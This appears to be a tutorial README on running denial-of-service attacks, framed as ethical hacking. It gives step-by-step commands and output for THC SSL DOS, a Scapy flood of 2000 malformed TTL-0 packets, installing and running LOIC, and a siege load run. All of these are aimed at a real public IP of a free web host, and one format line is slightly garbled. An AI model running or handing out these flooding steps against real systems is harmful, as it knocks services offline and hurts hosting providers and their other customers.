# Technical Dos attacks
Ethical Hacking - Dos attacks on different services.
<hr>

## The different tools
* Metasploit
* Nmap NSE
* Exploit database
* Scapy
<hr>

## DOS/DDOS categories
 * Session abuse.
 * Attacks based on packet volume.
 * Protocol-based attacks.
 * Attacks based on the application layer.
## The tools we are going to use
 * Low Orbit Ion Cannon
 * THC SSL DOS
 * Scapy 
 * Slowloris
 * https://upordown.ultrawebhosting.com/
 <hr>

 # let's try it
 # 1st tool is a website : https://upordown.ultrawebhosting.com/
<img src="ultra.png" width="100%">
I will check if my site is available or not following service denial attacks.
https://samglishinc.000webhostapp.com
<img src="test.png" width="100%">
we see that the website is available.

# THC SSL DOS
```bash
thc-ssl-dos 
```
```bash
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

./thc-ssl-dos [options] <ip> <port>
  -h      help
  -l <n>  Limit parallel connections [default: 400]
```
how to use : `thc-ssl-dos ip_target --accept`

i want to test my website: 
let's see ip adress

run this command
```bash
dmitry samglishinc.000webhostapp.com
```
Output
```bash
Deepmagic Information Gathering Tool
"There be some deep magic going on"

HostIP:145.14.145.210
HostName:samglishinc.000webhostapp.com

Gathered Inet-whois information for 145.14.145.210
---------------------------------
```

```bash
thc-ssl-dos 145.14.145.210 --accept
```
Output
```bash
Waiting for script kiddies to piss off................
The force is with those who read the source...
Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
Handshakes 4[4.310 h/s], 2 Conn, 0 Err
```
# Scapy
```bash
scapy
```
Output
```bash
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
                                      
                     aSPY//YASa       
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like I craft my beer.
       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
      sY/////////y  caa           S//P   |
       cayCyayP//Ya              pY/Ya
        sY/PsY////YCc          aC//Yp 
         sc  sccaCY//PCypaapyCP//YSs  
                  spCPY//////YPSps    
                       ccaacs         
                                       using IPython 8.18.1
>>> 
```
We will send a packet with a TTL 0, it is a malformed packet which will create confusion for the target server then a service denial we will send millions of requests.

Format `end(dst="ip", ttl=0)/TCP(),iface="",count=2000)`    

see your ip_adress and nerwork interface
```bash
ifconfig
```
`adresse cible` : 
`malformed packet` : use TTL 0
`packet volume`: 2000
`interface` : wlo1
```bash
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
                                      
                     aSPY//YASa       
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like I craft my beer.
       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
      sY/////////y  caa           S//P   |
       cayCyayP//Ya              pY/Ya
        sY/PsY////YCc          aC//Yp 
         sc  sccaCY//PCypaapyCP//YSs  
                  spCPY//////YPSps    
                       ccaacs         
                                       using IPython 8.18.1
>>>send(IP(dst="145.14.145.210", ttl=0)/TCP(),iface="wlo1",count=2000)
```
```
................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
Sent 2000 packets.
```
for more information visit: http://sdz.tdct.org/sdz/manipulez-les-paquets-reseau-avec-scapy.html

# Low Orbit Ion Cannon (LOIC)
Install LOIC

create folder `Loic`
```
mkdir Loic
```
```
cd Loic/
```
```
git clone https://github.com/nicolargo/loicinstaller.git
```
```
cd loicinstaller/
```
```
./loic.sh
```
Usage: ./loic.sh <install|update|run>
```
./loic.sh install
```
run
```
./loic.sh run
```
<img src="L1.png" width="80%">
<img src="L2.png" width="80%">

# siege
```bash
siege
```
Output
```bash
New configuration template added to /home/samglish/.siege
Run siege -C to view the current settings in that file
SIEGE 4.0.7
Usage: siege [options]
       siege [options] URL
       siege -g URL
Options:
  -V, --version             VERSION, prints the version number.
  -h, --help                HELP, prints this section.
  -C, --config              CONFIGURATION, show the current config.
  -v, --verbose             VERBOSE, prints notification to screen.
  -q, --quiet               QUIET turns verbose off and suppresses output.
  -g, --get                 GET, pull down HTTP headers and display the
                            transaction. Great for application debugging.
  -p, --print               PRINT, like GET only it prints the entire page.
  -c, --concurrent=NUM      CONCURRENT users, default is 10
  -r, --reps=NUM            REPS, number of times to run the test.
  -t, --time=NUMm           TIMED testing where "m" is modifier S, M, or H
                            ex: --time=1H, one hour test.
  -d, --delay=NUM           Time DELAY, random delay before each request
  -b, --benchmark           BENCHMARK: no delays between requests.
  -i, --internet            INTERNET user simulation, hits URLs randomly.
  -f, --file=FILE           FILE, select a specific URLS FILE.
  -R, --rc=FILE             RC, specify an siegerc file
  -l, --log[=FILE]          LOG to FILE. If FILE is not specified, the
                            default is used: /var/log/siege.log
  -m, --mark="text"         MARK, mark the log file with a string.
                            between .001 and NUM. (NOT COUNTED IN STATS)
  -H, --header="text"       Add a header to request (can be many)
  -A, --user-agent="text"   Sets User-Agent in request
  -T, --content-type="text" Sets Content-Type in request
  -j, --json-output         JSON OUTPUT, print final stats to stdout as JSON
      --no-parser           NO PARSER, turn off the HTML page parser
      --no-follow           NO FOLLOW, do not follow HTTP redirects

Copyright (C) 2018 by Jeffrey Fulmer, et al.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.
```
```bash
siege samglishinc.000webhostapp.com
```
```bash
{	"transactions":			        9842,
	"availability":			       99.93,
	"elapsed_time":			      442.90,
	"data_transferred":		        9.92,
	"response_time":		        1.06,
	"transaction_rate":		       22.22,
	"throughput":			        0.02,
	"concurrency":			       23.49,
	"successful_transactions":	        7646,
	"failed_transactions":		           7,
	"longest_transaction":		       38.89,
	"shortest_transaction":		        0.35
}
```